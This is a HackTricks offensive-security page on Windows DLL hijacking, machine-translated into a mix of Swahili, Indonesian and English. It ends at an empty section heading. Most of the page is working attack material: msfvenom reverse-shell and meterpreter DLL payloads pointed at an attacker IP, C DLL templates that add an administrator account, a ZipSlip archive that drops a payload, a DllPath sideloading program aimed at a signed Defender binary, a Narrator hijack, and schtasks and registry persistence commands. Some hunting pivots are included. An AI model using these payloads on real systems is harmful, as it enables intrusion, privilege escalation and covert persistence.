# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking inahusisha kudanganya application ya kuaminika ili ipakie malicious DLL. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, na Side-Loading**. Hutumika zaidi kwa code execution, kupata persistence, na mara chache zaidi, privilege escalation. Licha ya lengo hapa kuwa escalation, njia ya hijacking hubaki ileile katika malengo yote.

### Common Techniques

Mbinu kadhaa hutumika kwa DLL hijacking, na kila moja ina ufanisi wake kulingana na DLL loading strategy ya application:

1. **DLL Replacement**: Kubadilisha DLL halali na ile malicious, kwa hiari ukitumia DLL Proxying ili kuhifadhi functionality ya asili ya DLL.
2. **DLL Search Order Hijacking**: Kuweka malicious DLL katika search path kabla ya ile halali, kwa kutumia search pattern ya application.
3. **Phantom DLL Hijacking**: Kuunda malicious DLL ili application ipakie, ikidhani ni required DLL isiyokuwepo.
4. **DLL Redirection**: Kubadilisha search parameters kama `%PATH%` au faili za `.exe.manifest` / `.exe.local` ili kuelekeza application kwenye malicious DLL.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na ile malicious katika directory ya WinSxS, njia ambayo mara nyingi huhusishwa na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka malicious DLL katika directory inayodhibitiwa na user pamoja na application iliyonakiliwa, ikifanana na Binary Proxy Execution techniques.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading siyo njia pekee ya kuifanya trusted **.NET Framework** process ipakie attacker code. Ikiwa target executable ni application ya **managed**, CLR pia huangalia **application configuration file** yenye jina la executable (kwa mfano `Setup.exe.config`). Faili hiyo inaweza kufafanua **AppDomainManager** maalum. Ikiwa config inaelekeza kwenye attacker-controlled assembly iliyowekwa pembeni ya EXE, CLR huipakia **kabla ya application's normal code path** na huendesha ndani ya trusted process.

Kulingana na .NET Framework configuration schema ya Microsoft, `<appDomainManagerAssembly>` na `<appDomainManagerType>` zote lazima ziwepo ili custom manager itumike.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Meneja mdogo:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Practical notes:
- Hii ni tradecraft mahususi ya **.NET Framework**. Inategemea CLR config parsing, si Win32 DLL search order.
- Host lazima iwe kweli **managed EXE**. Uhakiki wa haraka: `sigcheck -m target.exe`, `corflags target.exe`, au angalia **CLR Runtime Header** kwenye PE metadata.
- Jina la config lazima lilingane kabisa na jina la executable (`<binary>.config`) na kwa kawaida huwepo **karibu na EXE**.
- Hii ni muhimu na **signed Microsoft/vendor binaries** kwa sababu trusted EXE hubaki bila kuguswa wakati malicious managed assembly inatekelezwa ndani ya process.
- Kama tayari una writable installer/update directory, AppDomainManager hijacking inaweza kutumika kama **first stage**, ikifuatiwa na classic DLL sideloading au reflective loading kwa stages za baadaye.

### AppDomainManager as a downloader + scheduled-task bootstrap

Muundo wa practical intrusion ni kuoanisha trusted managed EXE na `*.config` mbaya pamoja na AppDomainManager DLL mbaya ambayo hufanya kazi tu kama **small bootstrapper**:

1. User anazindua signed .NET installer au updater kutoka eneo linaloaminika kama `%USERPROFILE%\Downloads`.
2. Config iliyo pembeni husababisha CLR kupakia attacker assembly **kabla** ya app logic halali kuanza.
3. Malicious manager hufanya **path gate** (kwa mfano, endelea tu kama host EXE inaendeshwa kutoka `Downloads`, na ruhusu tu second stage kuendeshwa kutoka `%LOCALAPPDATA%`).
4. Ikiwa ukaguzi unapita, inapakua real payload kwenye user-writable path kama `%LOCALAPPDATA%\PerfWatson2.exe` na kusanidi persistence kwa scheduled task.

Kwa nini variant hii ni muhimu:
- Signed host EXE hubaki bila mabadiliko, hivyo triage inayohash tu main binary inaweza kukosa compromise.
- Rahisi **path-based anti-analysis** ni ya kawaida: kuhamisha triad ya ZIP/EXE/DLL kwenda Desktop, Temp, au sandbox path kunaweza kwa makusudi kuvunja chain.
- First-stage AppDomainManager DLL inaweza kubaki ndogo na yenye noise kidogo wakati real implant inaletwa baadaye.

Minimal persistence example ambayo mara nyingi huonekana na pattern hii:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Catatan:
- ` /rl highest` berarti **tertinggi yang tersedia** untuk user/session tersebut; itu bukan eskalasi SYSTEM yang terjamin dengan sendirinya.
- Teknik ini sering lebih tepat dikategorikan sebagai **execution/persistence via .NET config abuse** daripada classic missing-DLL search-order hijacking, meskipun operator sering menggabungkan keduanya.

Detection pivots:
- Signed .NET executables yang diluncurkan dari jalur ekstraksi **ZIP**, `Downloads`, `%TEMP%`, atau folder lain yang dapat ditulis user dengan `<exe>.config` yang **berada berdampingan**.
- New scheduled tasks yang action-nya mengarah ke `%LOCALAPPDATA%`, `%APPDATA%`, atau `Downloads` dan namanya meniru browser/vendor updaters.
- Short-lived managed bootstrap processes yang segera mengunduh EXE lain, lalu menjalankan `schtasks.exe`.
- Samples yang keluar lebih awal kecuali path executable cocok dengan direktori user-profile yang diharapkan.

### Hijacking an existing scheduled task to relaunch the sideload chain

Untuk persistence, jangan hanya melihat **membuat task baru**. Beberapa intrusion sets menunggu sampai installer legit membuat **normal updater task** lalu **menulis ulang task action** sehingga nama, author, dan trigger yang ada tetap terlihat familiar bagi defenders.

Reusable workflow:
1. Install/jalankan software legit dan identifikasi task yang biasanya dibuatnya.
2. Export XML task dan catat nilai `<Exec><Command>` / `<Arguments>` saat ini.
3. Ganti hanya action-nya agar task menjalankan **trusted host EXE** Anda dari user-writable staging directory, yang kemudian melakukan side-load atau AppDomain-load terhadap payload asli.
4. Daftarkan ulang nama task yang sama alih-alih membuat artifact persistence baru yang jelas.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Mengapa hii ni stealthier:
- Jina la task bado linaweza kuonekana la kihalali (kwa mfano updater wa vendor).
- **Task Scheduler service** hui-launch, hivyo parent/ancestor validation mara nyingi huona chain ya scheduling inayotarajiwa badala ya `explorer.exe`.
- Timu za DFIR zinazowinda tu **majina mapya ya task** zinaweza kukosa task ambayo usajili wake tayari ulikuwepo lakini action yake sasa inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au njia nyingine inayodhibitiwa na attacker.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Linganisha `C:\Windows\System32\Tasks\*` XML na `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata dhidi ya baseline.
- Toa alert wakati **vendor-looking updater task** ina-execute kutoka **user-writable directories** au inaanzisha .NET EXE yenye faili `*.config` iliyo sambamba nayo.

> [!TIP]
> Kwa step-by-step chain inayochanganya HTML staging, AES-CTR configs, na .NET implants juu ya DLL sideloading, pitia workflow hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Njia ya kawaida ya kupata missing Dlls ndani ya system ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **kukiweka** **filters 2 zifuatazo**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

na kuonyesha tu **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Ikiwa unatafuta **missing dlls kwa ujumla** acha hii iende kwa **sekunde** chache.\
Ikiwa unatafuta **missing dll ndani ya executable maalum** unapaswa kuweka **filter nyingine kama "Process Name" "contains" `<exec name>`, uik execute, kisha ustop capturing events**.

## Exploiting Missing Dlls

Ili kuongeza privileges, nafasi bora tuliyo nayo ni kuweza **kuandika dll ambayo privilege process itajaribu ku-load** mahali ambapo **ita-searchwa**. Hivyo, tutaweza **kuandika** dll katika **folder** ambapo **dll inatafutwa kabla ya** folder ambamo **original dll** iko (weird case), au tutaweza **kuandika kwenye folder** ambayo dll itatafutwa humo na original **dll haipo** katika folder yoyote.

### Dll Search Order

**Ndani ya** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kupata jinsi Dlls zinavyo-loadwa kwa njia mahususi.**

**Windows applications** hutafuta DLLs kwa kufuata seti ya **pre-defined search paths**, kwa mpangilio fulani. Tatizo la DLL hijacking hutokea wakati DLL mbaya inawekwa kimkakati katika moja ya directories hizi, kuhakikisha kwamba ina-loadwa kabla ya authentic DLL. Suluhisho la kuzuia hili ni kuhakikisha application inatumia absolute paths inaporefer DLLs zinazohitajika.

Unaweza kuona **DLL search order kwenye 32-bit** systems hapa chini:

1. Directory ambayo application ililipishwa kutoka humo.
2. System directory. Tumia [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function kupata path ya directory hii.(_C:\Windows\System32_)
3. 16-bit system directory. Hakuna function inayopata path ya directory hii, lakini inatafutwa. (_C:\Windows\System_)
4. Windows directory. Tumia [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function kupata path ya directory hii.
1. (_C:\Windows_)
5. Current directory.
6. Directories zilizoorodheshwa kwenye PATH environment variable. Kumbuka kwamba hii haijumui per-application path iliyobainishwa na **App Paths** registry key. Key ya **App Paths** haitumiki wakati wa kuhesabu DLL search path.

Hiyo ndiyo **default** search order ikiwa **SafeDllSearchMode** imewezeshwa. Iwapo imezimwa current directory hupanda hadi nafasi ya pili. Ili kuzima feature hii, tengeneza registry value ya **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kuwa 0 (default ni enabled).

Ikiwa [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function itaitwa na **LOAD_WITH_ALTERED_SEARCH_PATH** search huanza kwenye directory ya executable module ambayo **LoadLibraryEx** ina-load.

Hatimaye, kumbuka kwamba **dll inaweza ku-loadwa kwa kuonyesha absolute path badala ya jina tu**. Katika hali hiyo dll hiyo **ita-searchwa tu kwenye path hiyo** (ikiwa dll ina dependencies, hizo zita-searchwa kama zilivyo-loadwa kwa jina tu).

Kuna njia nyingine za kubadilisha search order lakini sitaeleza hapa.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Tumia **ProcMon** filters (`Process Name` = target EXE, `Path` inaisha na `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambayo process inajaribu lakini haipati.
2. Ikiwa binary ina-run kwenye **schedule/service**, kudondosha DLL yenye moja ya majina hayo kwenye **application directory** (search-order entry #1) ita-loadwa kwenye execution inayofuata. Katika kesi moja ya .NET scanner process ilitafuta `hostfxr.dll` kwenye `C:\samples\app\` kabla ya ku-load copy ya kweli kutoka `C:\Program Files\dotnet\fxr\...`.
3. Jenga payload DLL (kwa mfano reverse shell) yenye export yoyote: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ikiwa primitive yako ni **ZipSlip-style arbitrary write**, tengeneza ZIP ambayo entry yake inaescape extraction dir ili DLL iangukie kwenye app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Deliver the archive to the watched inbox/share; when the scheduled task re-launches the process it loads the malicious DLL and executes your code as the service account.

### Kulazimisha sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya hali ya juu ya kuathiri kwa uhakika DLL search path ya process mpya iliyoundwa ni kuweka sehemu ya DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda process kwa kutumia ntdll native APIs. Kwa kutoa directory inayodhibitiwa na mshambuliaji hapa, target process inayotatua imported DLL kwa jina pekee (bila absolute path na bila kutumia safe loading flags) inaweza kulazimishwa kupakia malicious DLL kutoka kwenye directory hiyo.

Key idea
- Tengeneza process parameters kwa RtlCreateProcessParametersEx na toa custom DllPath inayoelekeza kwenye folder yako unayodhibiti (kwa mfano, directory ambako dropper/unpacker yako ipo).
- Unda process kwa RtlCreateUserProcess. Wakati target binary inapotatua DLL kwa jina, loader itaangalia DllPath hii iliyotolewa wakati wa resolution, ikiwezesha sideloading ya kuaminika hata kama malicious DLL haipo karibu na target EXE.

Notes/limitations
- Hii inaathiri child process inayoundwa; ni tofauti na SetDllDirectory, ambayo huathiri current process pekee.
- Target lazima iimport au iite LoadLibrary DLL kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na hardcoded absolute paths haziwezi kufanyiwa hijack. Forwarded exports na SxS vinaweza kubadili precedence.

Mfano mdogo wa C (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Weka `xmllite.dll` hasidi (ikitoa functions zinazohitajika au ikiprokisiwa kwenda kwa ya kweli) kwenye directory yako ya DllPath.
- Zindua signed binary inayojulikana kutafuta `xmllite.dll` kwa jina ikitumia technique hapo juu. loader hutatua import kupitia DllPath iliyotolewa na kufanya sideload your DLL.

Techinque hii imeonekana in-the-wild ikitumiwa kuendesha multi-stage sideloading chains: initial launcher huacha helper DLL, kisha huanzisha Microsoft-signed, hijackable binary yenye custom DllPath ili kulazimisha kupakia DLL ya attacker kutoka staging directory.


### .NET AppDomainManager hijacking via `.exe.config`

Kwa **.NET Framework** targets, sideloading inaweza kufanywa **before `Main()`** bila patching memory kwa kutumia vibaya faili la karibu la programu **`.exe.config`**. Badala ya kutegemea tu Win32 DLL search order, attacker huweka legitimate .NET EXE kando ya malicious config na moja au zaidi attacker-controlled assemblies.

Jinsi chain inavyofanya kazi:
1. Host EXE inaanza na **CLR husoma `<exe>.config`**.
2. Config huweka **`<appDomainManagerAssembly>`** na **`<appDomainManagerType>`** ili runtime iinstantiate attacker-controlled `AppDomainManager`.
3. Malicious manager hupata **pre-`Main()` execution** ndani ya trusted host process.
4. Config hiyo hiyo inaweza kulazimisha CLR kutatua local assemblies kwanza (kwa mfano `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) na inaweza kudhoofisha runtime validation/telemetry bila inline patching.

Campaign-style pattern (exact nesting can vary by directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Kwa nini hii ni muhimu:
- **`<probing privatePath="."/>`** huweka assembly resolution ndani ya application directory, na kuifanya folda kuwa predictable sideloading surface.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** huhamisha execution kwenda kwenye attacker code wakati wa CLR initialization, kabla ya legitimate app logic kuanza.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** inaweza kuruhusu full-trust app kupakia unsigned au tampered assemblies bila strong-name validation failure.
- **`<publisherPolicy apply="no"/>`** huepuka publisher-policy redirects kwenda kwenye assemblies mpya zaidi.
- **`<requiredRuntime ... safemode="true"/>`** hufanya runtime selection kuwa more deterministic.
- **`<etwEnable enabled="false"/>`** ni ya kuvutia hasa kwa sababu **CLR huzima own ETW visibility** kutoka kwenye configuration badala ya implant patching `EtwEventWrite` kwenye memory.

Operational pattern iliyoonekana kwenye recent campaigns:
- Stage 1 huacha `setup.exe`, `setup.exe.config`, na local assemblies.
- Stage 2 huzi-copy kwenda kwenye folda ya kuaminika ya **AppData update**, hubadili jina la host kuwa kitu kama `update.exe`, na hui-launch tena kupitia **scheduled task**.
- Stage 3 huverify execution context (kwa mfano expected parent `svchost.exe` kutoka Task Scheduler) kabla ya kupakia final RAT DLL/export.

Hunting ideas:
- Signed au vinginevyo legitimate **.NET executables** zinazoendeshwa zikiwa na suspicious adjacent **`.config`** files katika user-writable locations.
- `.config` files zenye **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, au **`etwEnable enabled="false"`**.
- Scheduled tasks zinazorelaunch renamed update binaries kutoka **`%LOCALAPPDATA%`** au app-specific `\bin\update\` directories.
- Parent/child chains ambapo scheduled task inaz launch trusted .NET host ambayo mara moja inapakia non-vendor assemblies kutoka kwenye directory yake yenyewe.

#### Exceptions on dll search order from Windows docs

Mabadiliko fulani kwenye standard DLL search order yameandikwa kwenye Windows documentation:

- Wakati **DLL inayoshiriki jina lake na nyingine ambayo tayari imepakiwa kwenye memory** inapopatikana, mfumo hupita usual search. Badala yake, hufanya ukaguzi wa redirection na manifest kabla ya kurudi kwenye DLL ambayo tayari iko kwenye memory. **Katika hali hii, mfumo haufanyi search ya DLL**.
- Katika hali ambapo DLL inatambuliwa kama **known DLL** kwa current Windows version, mfumo utatumia version yake ya known DLL, pamoja na dependent DLLs zake zozote, **ukiacha search process**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** hushikilia orodha ya known DLLs hizi.
- Ikiwa **DLL ina dependencies**, search ya dependent DLLs hizi hufanywa kana kwamba zimetajwa tu kwa **module names** zao, bila kujali kama initial DLL ilitambuliwa kupitia full path.

### Escalating Privileges

**Requirements**:

- Tambua process inayofanya kazi au itakayofanya kazi chini ya **different privileges** (horizontal au lateral movement), ambayo **inakosa DLL**.
- Hakikisha kuna **write access** kwa kila **directory** ambako **DLL** itatafutwa. Eneo hili linaweza kuwa directory ya executable au directory ndani ya system path.

Ndiyo, requisites ni ngumu kupatikana kwa sababu **by default ni ajabu kupata privileged executable inayokosa dll** na ni **zaidi ajabu kuwa na write permissions kwenye system path folder** (huwezi kwa default). Lakini, katika misconfigured environments hili linawezekana.\
Ikiwa una bahati na ukajikuta unatimiza requirements, unaweza kuangalia project ya [UACME](https://github.com/hfiref0x/UACME). Hata kama **main goal ya project ni bypass UAC**, unaweza kupata humo **PoC** ya Dll hijaking kwa Windows version ambayo unaweza kutumia (huenda ukibadilisha tu path ya folda ambayo una write permissions).

Kumbuka kwamba unaweza **kucheck permissions zako kwenye folda** kwa kufanya:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za folda zote zilizo ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia imports za executable na exports za dll kwa:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili kuhusu jinsi ya **abuse Dll Hijacking to escalate privileges** ukiwa na ruhusa ya kuandika kwenye folda ya **System Path** angalia:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)itaangalia ikiwa una ruhusa ya kuandika kwenye folda yoyote ndani ya system PATH.\
Zana nyingine za automated zinazovutia za kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Example

Ikiwa unapata hali inayoweza kutumiwa, moja ya mambo muhimu zaidi kwa mafanikio ya kuitumia ni **kuunda dll inayosafirisha angalau functions zote ambazo executable itaziimport kutoka humo**. Hata hivyo, kumbuka kuwa Dll Hijacking ni muhimu ili [kupanda kutoka Medium Integrity level hadi High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda valid dll** ndani ya utafiti huu wa dll hijacking unaolenga dll hijacking kwa execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** unaweza kupata baadhi ya **basic dll codes** ambazo zinaweza kuwa muhimu kama **templates** au kuunda **dll yenye non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Kimsingi **Dll proxy** ni Dll inayoweza **execute your malicious code when loaded** lakini pia **ku-expose** na **kufanya kazi** kama ilivyotarajiwa kwa **relaying all the calls to the real library**.

Kwa kutumia tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza kweli **kuelekeza executable na kuchagua library** unayotaka ku-proxify na **generate proxified dll** au **kuelekeza Dll** na **generate proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86 sikuona toleo la x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Kumbuka kwamba katika visa kadhaa Dll unayokompaili lazima **isafirishe functions kadhaa** ambazo zita-loadiwa na process ya mwathirika, ikiwa functions hizi hazipo **binary haitaweza kuzipakia** na **exploit itafeli**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Mfano wa C++ DLL wenye uundaji wa mtumiaji</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL ya C mbadala yenye thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Uchunguzi Kesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe bado huangalia kwa kuanzia DLL ya localization inayotabirika, maalum kwa lugha, ambayo inaweza kuhijackiwa kwa arbitrary code execution na persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ikiwa DLL iliyoandikwa na mshambulizi na inayoweza kuandikwa ipo kwenye OneCore path, hupakiwa na DllMain(DLL_PROCESS_ATTACH) hutekelezwa. Hakuna exports zinazohitajika.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Hijack ya kawaida yenye urahisi itasababisha Narrator kuzungumza/kupambanua UI. Ili kubaki kimya, wakati wa attach enumerate thread za Narrator, fungua main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) na `SuspendThread` hiyo; endelea kwenye thread yako mwenyewe. Tazama PoC kwa code kamili.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa yaliyo hapo juu, kuanzisha Narrator hupakia DLL iliyopandikizwa. Kwenye secure desktop (logon screen), bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako hutekelezwa kama SYSTEM kwenye secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
